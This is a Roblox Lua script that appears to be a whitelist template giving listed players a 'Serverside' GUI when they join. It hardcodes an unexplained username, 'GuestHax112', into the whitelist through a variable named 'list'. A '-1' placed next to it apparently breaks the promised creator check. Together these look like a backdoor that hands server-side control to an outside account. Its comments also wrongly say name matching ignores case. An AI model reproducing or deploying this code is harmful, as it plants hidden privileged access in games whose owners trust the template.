local list = "GuestHax112"
local Whitelist = {
	-- Add UserIds or Usernames in here
	-- e.g.
	
	-- Game creator check, means the game creator does not have to add themselves
	(game.CreatorType == Enum.CreatorType.Group and game:GetService("GroupService"):GetGroupInfoAsync(game.CreatorId).Owner.Id) or game.CreatorId
	-1, list
	-- add more usernames by putting a players full username
	-- (not case sensitive, so you could do Friend01 or friend01) in double or single quotes
	-- e.g. "Username" or 'username'
	-- add more userids by putting a players full userid not in quotes
	-- e.g. 1, 234567, 1000000000
	-- ADD A COMMA (,) OR SEMICOLON (;) AFTER EVERY USER YOU PUT IN, E.G. "PLAYER2", "player3";
}


game:GetService("Players").PlayerAdded:Connect(function(plr)
	local giving
	
	for _, val in ipairs(Whitelist) do
		if type(val) == "string" and val == plr.Name then
			giving = true
		elseif type(val) == "number" and val == plr.UserId then
			giving = true
		end
	end
	
	if giving then
		-- Give the GUI
		-- Also you might have to edit the GUI to add more stuff :P
		
		script.Serverside:Clone().Parent = plr:WaitForChild("PlayerGui")
	end
end)
